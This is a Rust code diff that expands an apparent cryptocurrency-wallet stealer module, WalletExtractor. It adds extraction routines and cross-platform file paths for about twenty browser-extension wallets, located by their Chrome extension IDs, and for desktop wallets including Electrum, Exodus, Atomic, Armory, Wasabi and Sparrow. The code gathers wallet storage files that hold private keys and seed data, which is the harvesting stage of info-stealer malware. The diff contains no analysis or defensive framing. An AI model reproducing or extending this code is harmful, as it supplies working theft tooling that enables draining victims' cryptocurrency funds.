@@ -7,6 +7,8 @@ use super::errors::ExtractionError;
 use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};
 
 /// Extracts cryptocurrency wallet data
+/// 
+/// Supports 20+ wallet types across browser extensions and desktop applications
 pub struct WalletExtractor {
     include_locked: bool,
 }
@@ -15,17 +17,34 @@ impl WalletExtractor {
     pub fn new(include_locked: bool) -> Self {
         Self { include_locked }
     }
-    
+
     /// Extract all configured wallets
     pub fn extract_all(&self) -> Vec<ExtractionResult> {
         let mut results = Vec::new();
-        
+
+        // Browser Extension Wallets (LevelDB based)
         results.push(self.extract_metamask());
+        results.push(self.extract_phantom());
+        results.push(self.extract_trust_wallet());
+        results.push(self.extract_rabby());
+        results.push(self.extract_coinbase_wallet());
+        results.push(self.extract_binance_wallet());
+        results.push(self.extract_okx_wallet());
+        results.push(self.extract_ledger_live());
+        results.push(self.extract_math_wallet());
+        results.push(self.extract_atomex_wallet());
+        results.push(self.extract_jaxx_wallet());
+        results.push(self.extract_myetherwallet());
+
+        // Desktop Wallets
         results.push(self.extract_exodus());
         results.push(self.extract_electrum());
         results.push(self.extract_bitcoin_core());
-        results.push(self.extract_trust_wallet());
-        
+        results.push(self.extract_atomic_wallet());
+        results.push(self.extract_armory());
+        results.push(self.extract_wasabi_wallet());
+        results.push(self.extract_sparrow_wallet());
+
         results
     }
     
@@ -58,7 +77,91 @@ impl WalletExtractor {
         let targets = Self::trust_wallet_paths();
         self.extract_wallet_files(ExtractionTarget::TrustWallet, &targets, "ldb")
     }
-    
+
+    /// Extract Phantom wallet extension data
+    pub fn extract_phantom(&self) -> ExtractionResult {
+        let targets = Self::phantom_paths();
+        self.extract_wallet_files(ExtractionTarget::Phantom, &targets, "ldb")
+    }
+
+    /// Extract Rabby wallet extension data
+    pub fn extract_rabby(&self) -> ExtractionResult {
+        let targets = Self::rabby_paths();
+        self.extract_wallet_files(ExtractionTarget::Rabby, &targets, "ldb")
+    }
+
+    /// Extract Coinbase Wallet extension data
+    pub fn extract_coinbase_wallet(&self) -> ExtractionResult {
+        let targets = Self::coinbase_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::CoinbaseWallet, &targets, "ldb")
+    }
+
+    /// Extract Binance Chain Wallet extension data
+    pub fn extract_binance_wallet(&self) -> ExtractionResult {
+        let targets = Self::binance_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::BinanceWallet, &targets, "ldb")
+    }
+
+    /// Extract OKX Wallet extension data
+    pub fn extract_okx_wallet(&self) -> ExtractionResult {
+        let targets = Self::okx_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::OKXWallet, &targets, "ldb")
+    }
+
+    /// Extract Ledger Live extension data
+    pub fn extract_ledger_live(&self) -> ExtractionResult {
+        let targets = Self::ledger_live_paths();
+        self.extract_wallet_files(ExtractionTarget::LedgerLive, &targets, "ldb")
+    }
+
+    /// Extract MathWallet extension data
+    pub fn extract_math_wallet(&self) -> ExtractionResult {
+        let targets = Self::math_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::MathWallet, &targets, "ldb")
+    }
+
+    /// Extract Atomex wallet extension data
+    pub fn extract_atomex_wallet(&self) -> ExtractionResult {
+        let targets = Self::atomex_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::AtomexWallet, &targets, "ldb")
+    }
+
+    /// Extract Jaxx Liberty wallet data
+    pub fn extract_jaxx_wallet(&self) -> ExtractionResult {
+        let targets = Self::jaxx_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::JaxxWallet, &targets, "json")
+    }
+
+    /// Extract MyEtherWallet (MEW/CX) extension data
+    pub fn extract_myetherwallet(&self) -> ExtractionResult {
+        let targets = Self::myetherwallet_paths();
+        self.extract_wallet_files(ExtractionTarget::MyEtherWallet, &targets, "ldb")
+    }
+
+    /// Extract Atomic Wallet data
+    pub fn extract_atomic_wallet(&self) -> ExtractionResult {
+        let targets = Self::atomic_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::AtomicWallet, &targets, "")
+    }
+
+    /// Extract Armory wallet data
+    pub fn extract_armory(&self) -> ExtractionResult {
+        let targets = Self::armory_paths();
+        self.extract_wallet_files(ExtractionTarget::Armory, &targets, "wallet")
+    }
+
+    /// Extract Wasabi Wallet data
+    pub fn extract_wasabi_wallet(&self) -> ExtractionResult {
+        let targets = Self::wasabi_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::WasabiWallet, &targets, "")
+    }
+
+    /// Extract Sparrow Wallet data
+    pub fn extract_sparrow_wallet(&self) -> ExtractionResult {
+        let targets = Self::sparrow_wallet_paths();
+        self.extract_wallet_files(ExtractionTarget::SparrowWallet, &targets, "")
+    }
+
     fn extract_wallet_files(
         &self,
         target: ExtractionTarget,
@@ -282,27 +385,265 @@ impl WalletExtractor {
     
     fn trust_wallet_paths() -> Vec<PathBuf> {
         let mut paths = Vec::new();
-        
+
         // Trust Wallet extension ID: egjidjbpglichdcondbcbdnbddppkfpb
         if let Some(home) = env::var_os("HOME") {
             // Linux
             paths.push(PathBuf::from(&home).join(
                 ".config/google-chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
             ));
-            
+
             // macOS
             paths.push(PathBuf::from(&home).join(
                 "Library/Application Support/Google/Chrome/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
             ));
         }
-        
+
         if let Some(appdata) = env::var_os("APPDATA") {
             // Windows
             paths.push(PathBuf::from(&appdata).join(
                 "Google/Chrome/User Data/Default/Local Extension Settings/egjidjbpglichdcondbcbdnbddppkfpb"
             ));
         }
-        
+
+        paths
+    }
+
+    // === NEW WALLET PATH HELPERS ===
+
+    fn phantom_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Phantom extension ID: bfnaelmomeimhlpmgjnjnhhpklipkeci
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjnhhpklipkeci"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjnhhpklipkeci"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/bfnaelmomeimhlpmgjnjnhhpklipkeci"
+            ));
+        }
+        paths
+    }
+
+    fn rabby_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Rabby extension ID: acmacodkjbdgmoleebolmdjoninsdbch
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjoninsdbch"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjoninsdbch"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/acmacodkjbdgmoleebolmdjoninsdbch"
+            ));
+        }
+        paths
+    }
+
+    fn coinbase_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Coinbase Wallet extension ID: hnfanknocfeofbddgcijnmhnfnkdnaad
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad"
+            ));
+        }
+        paths
+    }
+
+    fn binance_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Binance Chain Wallet extension ID: fhbohimaelbohpjbbldcngcnapndodjp
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp"
+            ));
+        }
+        paths
+    }
+
+    fn okx_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // OKX Wallet extension ID: mcohilncbfahbmgdjkbpemcciiolgcge
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/mcohilncbfahbmgdjkbpemcciiolgcge"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/mcohilncbfahbmgdjkbpemcciiolgcge"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/mcohilncbfahbmgdjkbpemcciiolgcge"
+            ));
+        }
+        paths
+    }
+
+    fn ledger_live_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Ledger Live extension ID: ffclmkdnjbkghklpdpdhpmpbplbpndbi
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/ffclmkdnjbkghklpdpdhpmpbplbpndbi"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/ffclmkdnjbkghklpdpdhpmpbplbpndbi"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/ffclmkdnjbkghklpdpdhpmpbplbpndbi"
+            ));
+        }
+        paths
+    }
+
+    fn math_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // MathWallet extension ID: afikmomioklgkpnkdkndbomfhhgpnhko
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/afikmomioklgkpnkdkndbomfhhgpnhko"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/afikmomioklgkpnkdkndbomfhhgpnhko"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/afikmomioklgkpnkdkndbomfhhgpnhko"
+            ));
+        }
+        paths
+    }
+
+    fn atomex_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Atomex extension ID: kdldjfmfdpfe3kpbbfifbnpfoklhflhd
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/kdldjfmfdpfe3kpbbfifbnpfoklhflhd"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/kdldjfmfdpfe3kpbbfifbnpfoklhflhd"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/kdldjfmfdpfe3kpbbfifbnpfoklhflhd"
+            ));
+        }
+        paths
+    }
+
+    fn jaxx_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Jaxx Liberty desktop wallet
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(".config/jaxx"));
+            paths.push(PathBuf::from(&home).join("Library/Application Support/jaxx"));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join("Jaxx"));
+        }
+        paths
+    }
+
+    fn myetherwallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // MEW CX extension ID: nlbmnnijcnjkbjjhokpfpnookhpbopag
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(
+                ".config/google-chrome/Default/Local Extension Settings/nlbmnnijcnjkbjjhokpfpnookhpbopag"
+            ));
+            paths.push(PathBuf::from(&home).join(
+                "Library/Application Support/Google/Chrome/Default/Local Extension Settings/nlbmnnijcnjkbjjhokpfpnookhpbopag"
+            ));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join(
+                "Google/Chrome/User Data/Default/Local Extension Settings/nlbmnnijcnjkbjjhokpfpnookhpbopag"
+            ));
+        }
+        paths
+    }
+
+    fn atomic_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Atomic Wallet desktop
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(".config/atomic/Local Storage/leveldb"));
+            paths.push(PathBuf::from(&home).join("Library/Application Support/atomic/Local Storage/leveldb"));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join("atomic/Local Storage/leveldb"));
+        }
+        paths
+    }
+
+    fn armory_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Armory wallet
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(".armory"));
+            paths.push(PathBuf::from(&home).join("Library/Application Support/Armory"));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join("Armory"));
+        }
+        paths
+    }
+
+    fn wasabi_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Wasabi Wallet
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(".walletwasabi/client/Wallets"));
+            paths.push(PathBuf::from(&home).join("Library/Application Support/Wasabi/Client/Wallets"));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join("Wasabi/Client/Wallets"));
+        }
+        paths
+    }
+
+    fn sparrow_wallet_paths() -> Vec<PathBuf> {
+        let mut paths = Vec::new();
+        // Sparrow Wallet
+        if let Some(home) = env::var_os("HOME") {
+            paths.push(PathBuf::from(&home).join(".sparrow/wallets"));
+            paths.push(PathBuf::from(&home).join("Library/Application Support/Sparrow/wallets"));
+        }
+        if let Some(appdata) = env::var_os("APPDATA") {
+            paths.push(PathBuf::from(&appdata).join("Sparrow/wallets"));
+        }
         paths
     }
 }
